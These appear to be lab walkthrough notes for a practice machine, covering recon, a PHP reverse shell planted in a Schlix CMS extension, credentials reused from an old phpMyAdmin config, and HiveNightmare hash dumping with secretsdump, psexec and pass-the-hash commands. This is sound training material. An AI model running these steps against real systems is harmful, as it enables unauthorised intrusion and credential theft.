# Sams: Machine Notes (Playground)

## Recon

### Nmap
- Port 80/tcp: Apache 2.4.48 (Win64) PHP/7.3.29
- Port 443/tcp: HTTPS (Apache)
- Port 445/tcp: SMB
- Port 3306/tcp: MariaDB (Unauthorized)

### Web Enumeration
- Directory: `/testing/`
- Directory: `/testing/install/`
- Application identified: **Schlix CMS** (implied from notes).

## Initial Access

### Schlix CMS Exploitation (Malicious Extension)
- Requirements: Authenticated user (if possible to gain one, otherwise found a path via manual intervention or misconfig).
- Method:
  1. Login to admin panel.
  2. Navigate to Block Management (`/admin/app/core.blockmanager`).
  3. Download/Modifiy the 'mailchimp' extension (or similar).
  4. Modify `packageinfo.inc.php` to include a PHP reverse shell (e.g., Ivan Sincek's).
  5. Zip the modified extension and install it.
  6. Trigger execution by clicking the 'About' tab of the installed extension.

## Privilege Escalation

### Post-Exploitation Enumeration
- Found PowerShell history at: `C:\Users\sam\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- Found `config.inc.old.php` in `C:\xampp\phpMyAdmin\`:
```php
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'SeriousSAM14';
```

### Password Reuse
- Tested the password `SeriousSAM14` for `Administrator`.
```bash
netexec smb 192.168.54.248 -u Administrator -p SeriousSAM14
```
- Result: **Pwn3d!**

### Final Access (SYSTEM)
- Use `impacket-psexec` with the Administrator credentials:
```bash
impacket-psexec Sams-PC/Administrator:SeriousSAM14@192.168.54.248
```

---

## Alternative: HiveNightmare (SeriousSAM / CVE-2021-36934)
- Target OS Version: 10.0.19043.
- Vulnerable to **HiveNightmare** which allows non-admin users to read SAM/SECURITY/SYSTEM hives from Volume Shadow Copies.
- Execution:
```powershell
./HiveNightmare.exe
```
- This writes `SAM`, `SECURITY`, and `SYSTEM` files to the current directory.
- Exfiltrate files and use `secretsdump`:
```bash
python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
- Obtain Administrator hash and use Pass-the-Hash (PtH) with `psexec`:
```bash
python3 psexec.py -hashes :[NTHASH] administrator@192.168.x.x
```
